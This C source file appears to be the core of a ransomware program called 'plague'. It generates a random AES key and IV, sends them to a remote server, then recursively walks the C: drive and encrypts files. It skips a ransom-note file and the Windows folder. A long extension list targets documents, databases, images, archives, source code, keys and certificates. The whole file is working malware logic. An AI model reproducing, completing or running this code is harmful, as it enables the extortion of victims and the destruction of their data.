
#include "includes/plague.h"

void handleError()
{
    unsigned long errCode;

    while ((errCode = ERR_get_error()))
    {
        char *err = ERR_error_string(errCode, NULL);
        printf("%s\n", err);
    }
    abort();
}

char *str_concat(int nb_arg, ...) {
    int i;
    char *path;
    char *tmp;
    va_list ap;

    va_start(ap, nb_arg);
    if (!(path = malloc(1)))
        return NULL;
    *path = '\0';
    for (i = 0; i < nb_arg; i++) {
        tmp = va_arg(ap, char *);
        if (!(path = realloc(path, strlen(path) + strlen(tmp) + 1)))
            return NULL;
        path = strcat(path, tmp);
    }
    va_end(ap);
    return path;
}

int in_whitelist(char *str)
{
  char *whitelist[] = {"..", ".", "README-PLAGUE.txt", "Windows", 0}; //TODO revoir le dossier windows a ignorer

  for (int i = 0; whitelist[i] ; i++)
    if (strcmp(whitelist[i], str) == 0)
      return 1;
  return 0;
}

char *uppercase(char *str)
{
    char *upper;
    int i = 0;

    if (!(upper = malloc(sizeof(char *) * strlen(str))))
        return NULL;
    while(str[i])
    {
        upper[i] = (char)toupper((int)(str[i]));
        i++;
    }
    upper[i] = 0;
    return upper;
}

int endWith(const char *str, const char *suffix)
{
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix >  lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

int check_ext(const char *path)
{
    char *upper;

    // List of extentions files to encrypt.
    char *ext[] = {".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb", ".potx", ".sldx", ".jpeg",
                  ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif",
                  ".dot", ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc", ".dotm", ".ost", ".vdi", ".png",
                  ".asf", ".vb", ".db", ".sxc", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots",
                  ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1", ".accdb", ".ods", ".xlsm", ".vsd", ".aes", ".tif",
                  ".wmv", ".cmd", ".sqlitedb", ".max", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3",
                  ".3ds", ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc", ".uot", ".xlt", ".csv", ".bz2", ".psd",
                  ".wav", ".h", ".lay6", ".stw", ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw", ".xlc",
                  ".123", ".bak", ".svg", ".sh", ".cpp", ".mml", ".ott", ".xltx", ".wks", ".tar", ".djvu", ".class",
                  ".c", ".sxm", ".odt", ".xltm", ".wk1", ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem", ".ppt", ".pdf",
                  ".gz", ".m3u", ".java", ".suo", ".odg", ".p12", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop",
                  ".csr", ".pptm", ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt", ".pot", ".snt", ".zip",
                  ".flv", ".php", ".mdf", ".sxd", ".key", ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp",
                  ".pfx", ".ppsm", ".602", ".iso", ".mkv", ".brd", ".myi", ".odp", ".der", ".ppsx", ".sxi", NULL};

    //TODO Remplacer par un endWith()
    for (int i = 0; ext[i]; i++)
    {
        upper = uppercase(ext[i]);
        if (endWith(path, ext[i]) || endWith(path, upper))
        {
            if (upper)
                free(upper);
            return 1;
        }
        if (upper)
            free(upper);
    }
    return 0;
}

void apply_for_all(const char *path, void (*fct)(unsigned char [], unsigned char [], const char *), unsigned char key[], unsigned char iv[])
{
  DIR *d;
  struct dirent *dir;
  struct stat s;
  char *str = NULL;

  if (path && (d = opendir(path)))
  {
    while ((dir = readdir(d)) != NULL)
    {
      if (in_whitelist(dir->d_name))
        continue;
      str = str_concat(3, path, "\\", dir->d_name);               // Windows
        if ((stat(str, &s) == 0) && (s.st_mode & S_IFDIR))
            apply_for_all(str, fct, key, iv);
        else {
            fct(key, iv, str);
        }
      free(str);
      str = NULL;
    }
    closedir(d);
  }
}

int main()
{
    unsigned char key[KEY_SIZE];             // A 256 bit key
    unsigned char iv[IV_SIZE];              // A 128 bit IV
    char *path = strdup("C:\\");                                  // Windows
    char *encoded_key, *encoded_iv;
    int check = 0;

    //FreeConsole();
    // TODO rand_seed() to set unpredictable random
    //RAND_seed(&buf, 10);
    if (!RAND_bytes(key, KEY_SIZE))    // Key random generation
        handleError();
    if (!RAND_bytes(iv, KEY_SIZE))     //  IV random generation
        handleError();

    // Encode in hexa
    encoded_key = encode_hex(key, KEY_SIZE);
    encoded_iv = encode_hex(iv, IV_SIZE);

    // Send key and IV to server
    check = send_key(encoded_key, encoded_iv);
    if (check == 1)
        return 0;

    // Encrypt
    apply_for_all(path, &encrypt_file, key, iv);

    free(path);
    memset(key, 0, KEY_SIZE);                                   // Erase memory where was store the key
    memset(encoded_key, 0, KEY_SIZE * 2);
    free(encoded_key);
    return 0;
}